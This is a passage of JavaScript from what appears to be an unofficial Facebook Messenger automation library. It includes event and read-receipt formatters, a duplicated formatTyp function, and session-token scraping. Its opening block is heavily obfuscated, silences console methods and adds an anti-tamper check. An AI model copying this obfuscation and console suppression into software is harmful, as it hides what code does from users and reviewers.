-0x32c,_0x1868d9);}const _0x1f1387={};function _0xaa82b9(_0xfc0440,_0x2a50c7,_0x3a8975,_0x5a1043){return _0xbf4c(_0x2a50c7-0xcf,_0x3a8975);}_0x1f1387['SmaYy']=_0xaa82b9(0x2af,0x285,0x261,0x26b)+'+$';const _0x5a2c0b=_0x1f1387;return _0x561090[_0x5ad4e7(-0x1c4,-0x1bb,-0x1e6,-0x19f)]()[_0xaa82b9(0x285,0x272,0x25a,0x290)](_0x5a2c0b[_0xaa82b9(0x240,0x243,0x267,0x24e)])[_0xaa82b9(0x25e,0x240,0x221,0x260)]()['constructo'+'r'](_0x561090)[_0xaa82b9(0x277,0x272,0x286,0x245)](_0x5ad4e7(-0x14f,-0x176,-0x159,-0x176)+'+$');});_0x561090();function _0x90845d(_0x63e363,_0x5f0728,_0x104889,_0x4843a6){return _0xbf4c(_0x4843a6-0x15a,_0x63e363);}const _0x1d14cc=(function(){const _0x4dc124={};_0x4dc124[_0x47c9ea(0x4d0,0x501,0x4fd,0x4e8)]=_0x2dab51(-0x13b,-0x15c,-0x155,-0x143),_0x4dc124[_0x2dab51(-0x15a,-0x125,-0x153,-0x154)]=_0x2dab51(-0x16e,-0x16b,-0x14a,-0x125);function _0x47c9ea(_0x319527,_0xe62fb1,_0x325adc,_0x32398b){return _0xbf4c(_0x325adc-0x36d,_0x32398b);}function _0x2dab51(_0x3c6ad3,_0x53dc1f,_0x3be618,_0xcf689a){return _0xbf4c(_0x3be618- -0x2e6,_0x53dc1f);}const _0x1e6e08=_0x4dc124;let _0x480580=!![];return function(_0x40d035,_0x5d1389){const _0x406c27={};function _0x3a84bf(_0x16f1b7,_0x32febe,_0x9d723,_0x56e223){return _0x2dab51(_0x16f1b7-0x1de,_0x56e223,_0x9d723-0x2e,_0x56e223-0x153);}function _0x4af642(_0x2b5439,_0x2826b7,_0xc7eb24,_0x217233){return _0x2dab51(_0x2b5439-0x119,_0x2826b7,_0xc7eb24-0x94,_0x217233-0x1dd);}_0x406c27[_0x4af642(-0x9f,-0x97,-0xb2,-0x97)]=_0x1e6e08[_0x4af642(-0xab,-0xab,-0xc2,-0x9c)],_0x406c27[_0x3a84bf(-0x12e,-0x14d,-0x12b,-0x154)]=_0x1e6e08[_0x4af642(-0xaa,-0x95,-0xbf,-0xeb)];const _0x522ffd=_0x406c27,_0x3e8e49=_0x480580?function(){function _0xd9ac28(_0x21d254,_0x3b2cb1,_0x5d2ece,_0x371e3c){return _0x4af642(_0x21d254-0x85,_0x21d254,_0x371e3c-0x497,_0x371e3c-0xd9);}function _0x7d95e5(_0x4ac406,_0x562391,_0x2e5258,_0x5924b7){return _0x3a84bf(_0x4ac406-0x175,_0x562391-0xd0,_0x5924b7-0xe3,_0x4ac406);}if(_0x522ffd[_0xd9ac28(0x3f0,0x3eb,0x3e0,0x3e5)]!=='hoyzk'){if(_0x5d1389){if(_0x7d95e5(-0x57,-0x60,-0x70,-0x5d)===_0x522ffd[_0xd9ac28(0x3f5,0x3b8,0x3b3,0x3d2)])_0x3aaaca=_0xe58a42;else{const _0x719740=_0x5d1389['apply'](_0x40d035,arguments);return _0x5d1389=null,_0x719740;}}}else _0x344c74['adminIDs']=_0x37eec8['adminIDs'][_0x7d95e5(-0x21,-0x4d,0x4,-0x27)](_0x30fcd3=>_0x30fcd3['id']!=_0x478fda);}:function(){};return _0x480580=![],_0x3e8e49;};}());function _0xbf4c(_0x5a7175,_0x4c9fe2){const _0x27e617=_0x3c68();return _0xbf4c=function(_0xfe3f46,_0x21bf4e){_0xfe3f46=_0xfe3f46-(0x17c1*-0x1+-0x12dc+-0x2c0e*-0x1);let _0x526453=_0x27e617[_0xfe3f46];if(_0xbf4c['IzcvHb']===undefined){var _0x56d1aa=function(_0x14125b){const _0x3e3210='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x196c06='',_0x326801='',_0x442039=_0x196c06+_0x56d1aa;for(let _0x5dbaa4=-0xa7b*-0x3+0x1*-0x263b+0x6ca,_0x574b10,_0x474705,_0x53e9cd=-0x3ca+-0xf69+0x1*0x1333;_0x474705=_0x14125b['charAt'](_0x53e9cd++);~_0x474705&&(_0x574b10=_0x5dbaa4%(-0x11*-0xf7+0xd9a+-0x1dfd)?_0x574b10*(-0xecb+0x2*-0x11d1+0x32ad)+_0x474705:_0x474705,_0x5dbaa4++%(0x16ec+0x1*0x2c2+-0xcd5*0x2))?_0x196c06+=_0x442039['charCodeAt'](_0x53e9cd+(0x10fe+-0xa62+-0x349*0x2))-(-0x7*-0x52f+0x82+0x24c1*-0x1)!==-0xb5*0x23+0x83*0x47+0x2*-0x5cb?String['fromCharCode'](0x17*-0xb7+-0x1163*0x2+-0x29*-0x146&_0x574b10>>(-(0x84e*0x3+-0x19d+-0x174b)*_0x5dbaa4&0x2f9*0xb+-0x5*-0x63d+0x442*-0xf)):_0x5dbaa4:-0x1385+0x16f9*-0x1+0x2a7e){_0x474705=_0x3e3210['indexOf'](_0x474705);}for(let _0x5a7d01=-0x1859*-0x1+0x1df7+-0x3650,_0x4cfe36=_0x196c06['length'];_0x5a7d01<_0x4cfe36;_0x5a7d01++){_0x326801+='%'+('00'+_0x196c06['charCodeAt'](_0x5a7d01)['toString'](-0x411*-0x3+-0x9d*-0x9+-0x11a8))['slice'](-(0x7f8+-0xecf*-0x1+0x3*-0x797));}return decodeURIComponent(_0x326801);};_0xbf4c['XsIoiq']=_0x56d1aa,_0x5a7175=arguments,_0xbf4c['IzcvHb']=!![];}const _0x52eb15=_0x27e617[-0x9c7*-0x2+-0x81a*0x4+-0x46*-0x2f],_0x3a421a=_0xfe3f46+_0x52eb15,_0x389db3=_0x5a7175[_0x3a421a];if(!_0x389db3){const _0x182a27=function(_0x977d72){this['JxvHZD']=_0x977d72,this['dZfHCU']=[0x8ff+-0x1b51+0x1253*0x1,0x793+0x11c1+0x1*-0x1954,-0x29a*-0x1+-0x6*-0x3d4+-0x2*0xcc9],this['PLAyvQ']=function(){return'newState';},this['jTwSeY']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['nJaqzs']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x182a27['prototype']['FWbFhv']=function(){const _0x45d1d7=new RegExp(this['jTwSeY']+this['nJaqzs']),_0x79f226=_0x45d1d7['test'](this['PLAyvQ']['toString']())?--this['dZfHCU'][-0x297+-0xccc+0xa*0x18a]:--this['dZfHCU'][0x1811*-0x1+0x24ef+-0xcde];return this['pLijXX'](_0x79f226);},_0x182a27['prototype']['pLijXX']=function(_0x4d80b3){if(!Boolean(~_0x4d80b3))return _0x4d80b3;return this['oVXCpL'](this['JxvHZD']);},_0x182a27['prototype']['oVXCpL']=function(_0x7924f0){for(let _0x1cdb12=0x1add+-0xc8f+-0xe4e,_0x225d2e=this['dZfHCU']['length'];_0x1cdb12<_0x225d2e;_0x1cdb12++){this['dZfHCU']['push'](Math['round'](Math['random']())),_0x225d2e=this['dZfHCU']['length'];}return _0x7924f0(this['dZfHCU'][-0xad*0x8+-0x594+0xafc]);},new _0x182a27(_0xbf4c)['FWbFhv'](),_0x526453=_0xbf4c['XsIoiq'](_0x526453),_0x5a7175[_0x3a421a]=_0x526453;}else _0x526453=_0x389db3;return _0x526453;},_0xbf4c(_0x5a7175,_0x4c9fe2);}function _0x1039b2(_0x27000d,_0x56612c,_0x2f100e,_0x5dcded){return _0xbf4c(_0x27000d-0x2a2,_0x2f100e);}const _0x5ea624=_0x1d14cc(this,function(){const _0x9d4f71={'mnoWH':function(_0x1f91a7,_0x20f4af){return _0x1f91a7(_0x20f4af);},'VdRKp':function(_0x3e3068,_0x34458e){return _0x3e3068+_0x34458e;},'hJtnb':_0x20e409(0x464,0x455,0x47d,0x44e)+_0x20e409(0x44d,0x428,0x431,0x447),'ybSGQ':_0x20e409(0x420,0x41e,0x3ef,0x418)+_0x20e409(0x434,0x428,0x42b,0x432)+_0x24f642(-0x57,-0x82,-0xa4,-0x79)+'\x20)','yDymd':_0x20e409(0x3e7,0x418,0x413,0x3fc),'LWDUM':'exception','FoWpr':_0x20e409(0x471,0x443,0x462,0x44c),'vUGjH':function(_0x5cafaa,_0x57d91a){return _0x5cafaa<_0x57d91a;},'jHckf':_0x24f642(-0x87,-0x8a,-0xa5,-0x5f),'EvLzK':'RUsww'};function _0x24f642(_0x26f7a0,_0x5f36b5,_0x3aa74a,_0x23095f){return _0xbf4c(_0x5f36b5- -0x236,_0x23095f);}function _0x20e409(_0x5e04ef,_0x210c9e,_0xe586e3,_0x21ddf3){return _0xbf4c(_0x21ddf3-0x28a,_0x210c9e);}const _0x5df870=function(){let _0x45b555;function _0x55f51c(_0x554c52,_0x1c52e8,_0x546efe,_0x25ff8a){return _0x20e409(_0x554c52-0x1ea,_0x1c52e8,_0x546efe-0x145,_0x25ff8a- -0x265);}function _0x43a95d(_0x47b95e,_0x5e2e44,_0x4c4383,_0x5c6156){return _0x20e409(_0x47b95e-0xd2,_0x47b95e,_0x4c4383-0x1cb,_0x5e2e44- -0x16);}try{_0x45b555=_0x9d4f71[_0x55f51c(0x1e1,0x1c2,0x213,0x1ea)](Function,_0x9d4f71[_0x43a95d(0x3dc,0x3f7,0x3ea,0x409)](_0x9d4f71[_0x55f51c(0x1c3,0x1c1,0x1f5,0x1d8)],_0x9d4f71[_0x43a95d(0x434,0x423,0x431,0x41b)])+');')();}catch(_0x25c7ef){_0x45b555=window;}return _0x45b555;},_0x176271=_0x5df870(),_0x155258=_0x176271[_0x20e409(0x42b,0x42b,0x3f5,0x40a)]=_0x176271[_0x24f642(-0x97,-0xb6,-0x9f,-0xce)]||{},_0x3248fd=[_0x24f642(-0xa3,-0x86,-0x72,-0x90),'warn',_0x20e409(0x428,0x407,0x435,0x424),_0x9d4f71[_0x24f642(-0xd3,-0xb1,-0x82,-0x98)],_0x9d4f71[_0x20e409(0x462,0x41f,0x46f,0x448)],_0x24f642(-0x9b,-0xb2,-0x91,-0x8b),_0x9d4f71[_0x20e409(0x459,0x41a,0x467,0x43f)]];for(let _0x3c826b=-0xf3a+-0x1*0x6e2+-0x46c*-0x5;_0x9d4f71[_0x20e409(0x451,0x405,0x42f,0x428)](_0x3c826b,_0x3248fd[_0x24f642(-0x6e,-0x7c,-0x7e,-0x70)]);_0x3c826b++){if(_0x9d4f71[_0x24f642(-0xa4,-0xbf,-0xe2,-0xc1)]!==_0x9d4f71[_0x20e409(0x43a,0x41a,0x404,0x41e)]){const _0x4b2d67=_0x1d14cc['constructo'+'r'][_0x20e409(0x446,0x469,0x43c,0x449)][_0x20e409(0x443,0x407,0x423,0x430)](_0x1d14cc),_0x19891d=_0x3248fd[_0x3c826b],_0x1644d7=_0x155258[_0x19891d]||_0x4b2d67;_0x4b2d67[_0x24f642(-0x91,-0xa1,-0x92,-0xbe)]=_0x1d14cc[_0x24f642(-0x82,-0x90,-0xb5,-0xbb)](_0x1d14cc),_0x4b2d67['toString']=_0x1644d7['toString'][_0x20e409(0x44c,0x441,0x422,0x430)](_0x1644d7),_0x155258[_0x19891d]=_0x4b2d67;}else{const _0x1d83b8=_0x235964?function(){function _0x28855f(_0x5ddf6f,_0x2276a1,_0x2ccd36,_0x11e5ad){return _0x20e409(_0x5ddf6f-0x15d,_0x2ccd36,_0x2ccd36-0x70,_0x5ddf6f- -0x5b);}if(_0x478271){const _0x4526c8=_0x330dfb[_0x28855f(0x3f9,0x40e,0x407,0x3d4)](_0x1eb384,arguments);return _0x484a61=null,_0x4526c8;}}:function(){};return _0x10b0b9=![],_0x1d83b8;}}});_0x5ea624();if(global[_0x90845d(0x2f5,0x2cb,0x2dc,0x2f1)]['get']('isPremiumU'+_0x1039b2(0x443,0x46f,0x432,0x46b)))switch(hasData(formatID((m[_0x1039b2(0x428,0x428,0x448,0x43d)+_0x1039b2(0x41d,0x400,0x417,0x435)]['threadKey'][_0x1039b2(0x423,0x41f,0x3f6,0x446)]||m[_0x90845d(0x2e5,0x2df,0x30a,0x2e0)+_0x90845d(0x2d7,0x2bf,0x2f0,0x2d5)][_0x1039b2(0x42b,0x40c,0x449,0x417)][_0x90845d(0x330,0x341,0x2f4,0x315)+_0x1039b2(0x42d,0x443,0x43e,0x404)])[_0x1039b2(0x413,0x3f3,0x40b,0x40c)]()))){case!![]:{switch(logMessageType){case _0x1039b2(0x42a,0x457,0x457,0x437)+'-color':{let x=getData(formatID((m[_0x1039b2(0x428,0x411,0x423,0x3fe)+'adata']['threadKey'][_0x1039b2(0x423,0x409,0x40d,0x404)]||m[_0x1039b2(0x428,0x421,0x43a,0x44a)+_0x90845d(0x2d7,0x2d4,0x2bd,0x2d5)]['threadKey'][_0x1039b2(0x45d,0x479,0x430,0x461)+'bId'])[_0x90845d(0x2ce,0x2aa,0x2b0,0x2cb)]()));x[_0x1039b2(0x41e,0x43a,0x44b,0x407)]=logMessageData[_0x1039b2(0x43b,0x41d,0x40c,0x461)+'i']||x[_0x1039b2(0x41e,0x423,0x3fc,0x40a)],x[_0x1039b2(0x42c,0x452,0x402,0x42b)]=logMessageData['theme_colo'+'r']||x[_0x1039b2(0x42c,0x421,0x412,0x418)],updateData(formatID((m['messageMet'+_0x1039b2(0x41d,0x41e,0x428,0x424)]['threadKey']['threadFbId']||m[_0x1039b2(0x428,0x404,0x453,0x456)+_0x90845d(0x2a8,0x2e3,0x2e6,0x2d5)][_0x1039b2(0x42b,0x448,0x458,0x426)][_0x1039b2(0x45d,0x45a,0x47e,0x433)+'bId'])[_0x90845d(0x2ab,0x2e4,0x2d8,0x2cb)]()),x);}break;case'\x20log:threa'+_0x90845d(0x2f2,0x311,0x32a,0x2fc):{let x=getData(formatID((m['messageMet'+_0x90845d(0x2e3,0x2ad,0x2ee,0x2d5)]['threadKey']['threadFbId']||m[_0x90845d(0x2f4,0x2c9,0x2f8,0x2e0)+_0x1039b2(0x41d,0x436,0x3fc,0x402)][_0x90845d(0x2c2,0x311,0x2d2,0x2e3)][_0x1039b2(0x45d,0x437,0x44a,0x441)+_0x1039b2(0x42d,0x445,0x440,0x431)])['toString']()));x[_0x1039b2(0x41e,0x418,0x44a,0x421)]=logMessageData[_0x90845d(0x322,0x2e5,0x2f2,0x30b)+'n']||x['emoji'],updateData(formatID((m[_0x90845d(0x2d8,0x2d9,0x2ed,0x2e0)+_0x1039b2(0x41d,0x3f9,0x438,0x3f1)][_0x1039b2(0x42b,0x42f,0x426,0x410)][_0x1039b2(0x423,0x41e,0x40f,0x424)]||m[_0x90845d(0x2cc,0x2de,0x306,0x2e0)+_0x1039b2(0x41d,0x42d,0x420,0x3f3)][_0x1039b2(0x42b,0x44c,0x409,0x40b)][_0x90845d(0x331,0x32d,0x2e8,0x315)+_0x90845d(0x2bd,0x2f5,0x2b6,0x2e5)])[_0x90845d(0x2f6,0x2ef,0x2c7,0x2cb)]()),x);}break;case'log:user-n'+_0x90845d(0x311,0x2d1,0x2e0,0x2f5):{let x=getData(formatID((m[_0x90845d(0x304,0x2df,0x2f1,0x2e0)+'adata'][_0x90845d(0x2e5,0x2e6,0x2f5,0x2e3)][_0x90845d(0x2b2,0x302,0x2f6,0x2db)]||m[_0x1039b2(0x428,0x40a,0x419,0x42f)+_0x90845d(0x2f0,0x2e8,0x2d4,0x2d5)][_0x90845d(0x2e0,0x2d9,0x2f3,0x2e3)][_0x90845d(0x2f8,0x322,0x2f6,0x315)+_0x90845d(0x2fb,0x314,0x2de,0x2e5)])[_0x1039b2(0x413,0x418,0x416,0x419)]()));x[_0x1039b2(0x454,0x451,0x443,0x441)][logMessageData[_0x1039b2(0x41c,0x40c,0x411,0x448)+_0x90845d(0x323,0x30b,0x31d,0x31b)]]=logMessageData[_0x1039b2(0x44c,0x41f,0x449,0x45b)][_0x90845d(0x314,0x325,0x313,0x314)]==0x1416+0x1616+0x2a2c*-0x1?x[_0x90845d(0x32c,0x2ef,0x30e,0x307)][_0x1039b2(0x449,0x430,0x442,0x44a)](_0x52c3e1=>_0x52c3e1['id']==String(logMessageData[_0x90845d(0x2a7,0x2b2,0x2d7,0x2d4)+'t_id']))[_0x90845d(0x340,0x32c,0x313,0x313)]:logMessageData['nickname'],updateData(formatID((m['messageMet'+'adata']['threadKey'][_0x90845d(0x2bb,0x2c5,0x2f6,0x2db)]||m[_0x1039b2(0x428,0x42e,0x42d,0x442)+_0x1039b2(0x41d,0x42e,0x406,0x432)]['threadKey'][_0x90845d(0x302,0x2fc,0x2f0,0x315)+_0x1039b2(0x42d,0x412,0x431,0x44d)])[_0x1039b2(0x413,0x3ec,0x3fc,0x414)]()),x);}break;case _0x90845d(0x2e1,0x305,0x308,0x2e2)+_0x1039b2(0x431,0x416,0x446,0x420):{let x=getData(formatID((m['messageMet'+'adata'][_0x90845d(0x2c8,0x2b8,0x2bf,0x2e3)]['threadFbId']||m[_0x90845d(0x306,0x2fe,0x2f1,0x2e0)+_0x1039b2(0x41d,0x427,0x403,0x413)][_0x90845d(0x2cf,0x30a,0x2d7,0x2e3)][_0x90845d(0x332,0x335,0x317,0x315)+_0x1039b2(0x42d,0x453,0x43e,0x442)])['toString']()));switch(logMessageData[_0x90845d(0x314,0x2fe,0x2ef,0x2fe)+'T']){case'add_admin':{const _0x554187={};_0x554187['id']=logMessageData['TARGET_ID'],x['adminIDs'][_0x1039b2(0x43f,0x422,0x43b,0x426)](_0x554187);}break;case _0x90845d(0x2cd,0x2b3,0x2b3,0x2e1)+'in':{x['adminIDs']=x['adminIDs'][_0x90845d(0x2e1,0x32b,0x322,0x308)](_0x3fed1b=>_0x3fed1b['id']!=logMessageData['TARGET_ID']);}break;}updateData(formatID((m[_0x1039b2(0x428,0x425,0x431,0x42b)+_0x90845d(0x2f5,0x2b7,0x301,0x2d5)][_0x90845d(0x30c,0x2be,0x2b8,0x2e3)][_0x90845d(0x2b4,0x2d6,0x2cf,0x2db)]||m[_0x90845d(0x2c0,0x2f5,0x2bd,0x2e0)+_0x90845d(0x2be,0x2fe,0x2bc,0x2d5)]['threadKey'][_0x90845d(0x328,0x31f,0x334,0x315)+_0x1039b2(0x42d,0x45b,0x413,0x419)])['toString']()),x);}break;case _0x1039b2(0x42a,0x433,0x41c,0x442)+_0x1039b2(0x462,0x461,0x470,0x437)+_0x1039b2(0x46f,0x483,0x495,0x481):{let x=getData(formatID((m[_0x90845d(0x2cc,0x2e9,0x2e7,0x2e0)+_0x90845d(0x2a6,0x2ea,0x2e7,0x2d5)][_0x90845d(0x2bd,0x2c2,0x306,0x2e3)]['threadFbId']||m['messageMet'+_0x1039b2(0x41d,0x42e,0x3f8,0x3f7)][_0x1039b2(0x42b,0x44a,0x452,0x426)][_0x90845d(0x2f6,0x32a,0x31e,0x315)+_0x90845d(0x2c4,0x2d1,0x2cd,0x2e5)])['toString']()));x['approvalMo'+'de']==!![]?x[_0x1039b2(0x46b,0x46d,0x486,0x461)+'de']=![]:x[_0x1039b2(0x46b,0x45f,0x45c,0x45a)+'de']=!![],updateData(formatID((m[_0x1039b2(0x428,0x42e,0x41b,0x3fa)+'adata'][_0x1039b2(0x42b,0x40f,0x41f,0x40a)][_0x90845d(0x2f8,0x2f5,0x304,0x2db)]||m[_0x1039b2(0x428,0x425,0x3f9,0x432)+_0x90845d(0x2ed,0x2ca,0x300,0x2d5)][_0x1039b2(0x42b,0x435,0x439,0x44b)][_0x1039b2(0x45d,0x462,0x47d,0x442)+'bId'])['toString']()),x);}break;case _0x1039b2(0x42a,0x453,0x424,0x43b)+_0x1039b2(0x44d,0x430,0x456,0x44c):{let x=getData(formatID((m[_0x1039b2(0x428,0x41b,0x417,0x400)+_0x1039b2(0x41d,0x434,0x411,0x441)][_0x90845d(0x2ca,0x2c8,0x2d1,0x2e3)][_0x90845d(0x2f0,0x2c8,0x2b6,0x2db)]||m[_0x90845d(0x2bf,0x2d3,0x2e8,0x2e0)+_0x90845d(0x2fc,0x2b4,0x2c9,0x2d5)][_0x1039b2(0x42b,0x443,0x44e,0x448)][_0x1039b2(0x45d,0x441,0x473,0x484)+'bId'])[_0x90845d(0x2a0,0x2f5,0x2f6,0x2cb)]()));x[_0x1039b2(0x447,0x433,0x448,0x43e)]=logMessageData[_0x1039b2(0x45b,0x468,0x446,0x435)]||formatID((m['messageMet'+_0x1039b2(0x41d,0x40e,0x44c,0x3fd)][_0x1039b2(0x42b,0x446,0x45a,0x44f)][_0x1039b2(0x423,0x402,0x40e,0x3f5)]||m[_0x1039b2(0x428,0x434,0x42b,0x426)+_0x1039b2(0x41d,0x442,0x41f,0x415)][_0x90845d(0x304,0x305,0x2ee,0x2e3)][_0x1039b2(0x45d,0x480,0x482,0x462)+_0x90845d(0x2e8,0x311,0x2c4,0x2e5)])[_0x1039b2(0x413,0x418,0x432,0x421)]()),updateData(formatID((m[_0x1039b2(0x428,0x41c,0x426,0x3f9)+_0x90845d(0x2d3,0x2b4,0x2d5,0x2d5)][_0x1039b2(0x42b,0x423,0x442,0x44e)][_0x1039b2(0x423,0x42a,0x443,0x437)]||m[_0x90845d(0x2de,0x30c,0x2e1,0x2e0)+'adata'][_0x90845d(0x2c4,0x2fb,0x2f9,0x2e3)][_0x90845d(0x330,0x2fd,0x30f,0x315)+_0x90845d(0x2c4,0x2b9,0x30a,0x2e5)])[_0x1039b2(0x413,0x3eb,0x415,0x40e)]()),x);}break;case'log:subscr'+_0x1039b2(0x459,0x481,0x430,0x431):{let x=getData(formatID((m[_0x90845d(0x2ec,0x2c2,0x30b,0x2e0)+_0x1039b2(0x41d,0x445,0x414,0x410)][_0x1039b2(0x42b,0x438,0x414,0x44e)][_0x1039b2(0x423,0x41b,0x40f,0x43b)]||m[_0x1039b2(0x428,0x44f,0x43e,0x42d)+_0x1039b2(0x41d,0x445,0x418,0x414)]['threadKey'][_0x90845d(0x326,0x31f,0x320,0x315)+_0x1039b2(0x42d,0x449,0x439,0x445)])[_0x90845d(0x2a4,0x2d8,0x2df,0x2cb)]()));for(let o of logMessageData['addedParti'+_0x90845d(0x2bf,0x2f5,0x2c3,0x2ec)]){if(x[_0x1039b2(0x44f,0x44b,0x44a,0x472)]['some'](_0x4bcfe5=>_0x4bcfe5['id']==o['userFbId']))continue;else x[_0x90845d(0x31b,0x334,0x329,0x307)][_0x90845d(0x2f5,0x31f,0x30a,0x2f7)]({'id':o[_0x90845d(0x348,0x319,0x345,0x320)],'name':o['fullName'],'gender':getGenderByPhysicalMethod(o['fullName'])}),x[_0x1039b2(0x41c,0x3fd,0x40f,0x434)+'tIDs']['push'](o[_0x90845d(0x2f5,0x34e,0x309,0x320)]);}updateData(formatID((m['messageMet'+'adata'][_0x1039b2(0x42b,0x444,0x416,0x435)][_0x90845d(0x2d4,0x302,0x2f2,0x2db)]||m[_0x1039b2(0x428,0x413,0x438,0x451)+_0x90845d(0x2be,0x2c5,0x2b1,0x2d5)]['threadKey'][_0x1039b2(0x45d,0x452,0x471,0x484)+_0x1039b2(0x42d,0x403,0x404,0x428)])['toString']()),x);}break;case _0x1039b2(0x465,0x489,0x455,0x46d)+'cribe':{let x=getData(formatID((m[_0x90845d(0x2dc,0x30c,0x2e4,0x2e0)+'adata'][_0x1039b2(0x42b,0x3fe,0x40c,0x405)]['threadFbId']||m[_0x90845d(0x2e4,0x303,0x2f0,0x2e0)+_0x1039b2(0x41d,0x436,0x3f2,0x3ee)][_0x90845d(0x2e5,0x300,0x2d8,0x2e3)][_0x90845d(0x2f9,0x2ff,0x2f4,0x315)+_0x90845d(0x307,0x2bd,0x2d9,0x2e5)])['toString']()));for(let o of logMessageData['leftPartic'+_0x1039b2(0x441,0x41d,0x414,0x418)]){x[_0x1039b2(0x46d,0x43f,0x487,0x448)][_0x1039b2(0x44b,0x454,0x457,0x422)](_0x117377=>_0x117377['id']==o)&&(x['adminIDs']=x['adminIDs']['filter'](_0x41edb8=>_0x41edb8['id']!=o)),x[_0x1039b2(0x41c,0x433,0x3fc,0x411)+_0x90845d(0x31e,0x2d7,0x30a,0x2f2)][_0x90845d(0x321,0x2e9,0x303,0x308)](_0x2ae1f6=>_0x2ae1f6!=o),x[_0x1039b2(0x44f,0x446,0x42e,0x423)][_0x90845d(0x317,0x2e7,0x325,0x308)](_0x487be4=>_0x487be4['id']!=o);}updateData(formatID((m[_0x90845d(0x2bb,0x30a,0x2c6,0x2e0)+_0x90845d(0x2fb,0x2dc,0x2e7,0x2d5)][_0x1039b2(0x42b,0x41a,0x41c,0x444)][_0x1039b2(0x423,0x43d,0x40e,0x3ff)]||m['messageMet'+_0x90845d(0x2b2,0x2bb,0x2c1,0x2d5)][_0x90845d(0x2f0,0x2e7,0x2fe,0x2e3)][_0x90845d(0x2ee,0x325,0x2f3,0x315)+_0x1039b2(0x42d,0x451,0x41f,0x431)])[_0x90845d(0x2b9,0x2f7,0x2f4,0x2cb)]()),x);}break;}}}
  return {
      type: "event",
      threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
      logMessageType: logMessageType,
      logMessageData: logMessageData,
      logMessageBody: m.messageMetadata.adminText,
      author: m.messageMetadata.actorFbId,
      participantIDs: m.participants || []
  };
}

function formatTyp(event) {
  return {
      isTyping: !!event.st,
      from: event.from.toString(),
      threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
      // When receiving typ indication from mobile, `from_mobile` isn't set.
      // If it is, we just use that value.
      fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
      userID: (event.realtime_viewer_fbid || event.from).toString(),
      type: "typ"
  };
}

function formatTyp(event) {
    return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
        type: "typ"
    };
}

function formatDeltaReadReceipt(delta) {
    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
    // In a group chat actorFbId is used for the reader and threadFbId for the thread.
    return {
        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
        time: delta.actionTimestampMs,
        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),
        type: "read_receipt"
    };
}

function formatReadReceipt(event) {
    return {
        reader: event.reader.toString(),
        time: event.time,
        threadID: formatID((event.thread_fbid || event.reader).toString()),
        type: "read_receipt"
    };
}

function formatRead(event) {
    return {
        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
        time: event.timestamp,
        type: "read"
    };
}

function getFrom(str, startToken, endToken) {
    var start = str.indexOf(startToken) + startToken.length;
    if (start < startToken.length) return "";

    var lastHalf = str.substring(start);
    var end = lastHalf.indexOf(endToken);
    if (end === -1) throw Error("Could not find endTime `" + endToken + "` in the given string.");
    return lastHalf.substring(0, end);
}

function makeParsable(html) {
    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");

    // (What the fuck FB, why windows style newlines?)
    // So sometimes FB will send us base multiple objects in the same response.
    // They're all valid JSON, one after the other, at the top level. We detect
    // that and make it parse-able by JSON.parse.
    //       Ben - July 15th 2017
    //
    // It turns out that Facebook may insert random number of spaces before
    // next object begins (issue #616)
    //       rav_kr - 2018-03-19
    let maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

    return "[" + maybeMultipleObjects.join("},{") + "]";
}

function arrToForm(form) {
    return arrayToObject(form,
        function(v) {
            return v.name;
        },
        function(v) {
            return v.val;
        }
    );
}

function arrayToObject(arr, getKey, getValue) {
    return arr.reduce(function(acc, val) {
        acc[getKey(val)] = getValue(val);
        return acc;
    }, {});
}

function getSignatureID() {
    return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
    var d = new Date();
    return d.getHours() + ":" + padZeros(d.getMinutes());
}

function makeDefaults(html, userID, ctx) {
    var reqCounter = 1;
    var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

    // @Hack Ok we've done hacky things, this is definitely on top 5.
    // We totally assume the object is flat and try parsing until a }.
    // If it works though it's cool because we get a bunch of extra data things.
    //
    // Update: we don't need this. Leaving it in in case we ever do.
    //       Ben - July 15th 2017

    // var siteData = getFrom(html, "[\"SiteData\",[],", "},");
    // try {
    //   siteData = JSON.parse(siteData + "}");
    // } catch(e) {
    //   log.warn("makeDefaults", "Couldn't parse SiteData. Won't have access to some variables.");
    //   siteData = {};
    // }

    var ttstamp = "2";
    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
    var revision = getFrom(html, 'revision":', ",");

    function mergeWithDefaults(obj) {
        // @TODO This is missing a key called __dyn.
        // After some investigation it seems like __dyn is some sort of set that FB
        // calls BitMap. It seems like certain responses have a "define" key in the
        // res.jsmods arrays. I think the code iterates over those and calls `set`
        // on the bitmap for each of those keys. Then it calls
        // bitmap.toCompressedString() which returns what __dyn is.
        //
        // So far the API has been working without this.
        //
        //              Ben - July 15th 2017
        var newObj = {
            __user: userID,
            __req: (reqCounter++).toString(36),
            __rev: revision,
            __a: 1,
            // __af: siteData.features,
            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,
            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp
                // __spin_r: siteData.__spin_r,
                // __spin_b: siteData.__spin_b,
                // __spin_t: siteData.__spin_t,
        };

        // @TODO this is probably not needed.
        //         Ben - July 15th 2017
        // if (siteData.be_key) {
        //   newObj[siteData.be_key] = siteData.be_mode;
        // }
        // if (siteData.pkg_cohort_key) {
